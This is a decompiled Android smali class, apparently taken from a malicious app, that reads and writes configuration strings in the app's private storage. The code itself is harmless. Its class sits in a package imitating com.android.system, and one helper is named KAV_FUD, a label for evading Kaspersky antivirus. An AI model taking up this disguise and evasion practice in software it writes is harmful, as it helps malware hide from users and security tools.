.class public Lcom/android/system/IO;
.super Ljava/lang/Object;
.source "IO.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 15
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private KAV_FUD(Ljava/lang/StringBuilder;)Ljava/lang/String;
    .locals 1
    .param p1, "stringBuilder"    # Ljava/lang/StringBuilder;

    .prologue
    .line 61
    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "c"    # Landroid/content/Context;

    .prologue
    .line 30
    const-string v4, "!"

    .line 33
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p2, p1}, Landroid/content/Context;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 35
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 37
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 38
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 39
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 40
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 42
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 46
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 48
    invoke-direct {p0, v5}, Lcom/android/system/IO;->KAV_FUD(Ljava/lang/StringBuilder;)Ljava/lang/String;

    move-result-object v4

    .line 56
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 43
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 52
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 53
    :catch_1
    move-exception v6

    goto :goto_1
.end method

.method public writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    .locals 2
    .param p1, "config"    # Ljava/lang/String;
    .param p2, "data"    # Ljava/lang/String;
    .param p3, "c"    # Landroid/content/Context;

    .prologue
    .line 20
    :try_start_0
    new-instance v0, Ljava/io/OutputStreamWriter;

    const/4 v1, 0x0

    invoke-virtual {p3, p1, v1}, Landroid/content/Context;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 21
    .local v0, "outputStreamWriter":Ljava/io/OutputStreamWriter;
    invoke-virtual {v0, p2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 22
    invoke-virtual {v0}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 27
    .end local v0    # "outputStreamWriter":Ljava/io/OutputStreamWriter;
    :goto_0
    return-void

    .line 25
    :catch_0
    move-exception v1

    goto :goto_0
.end method
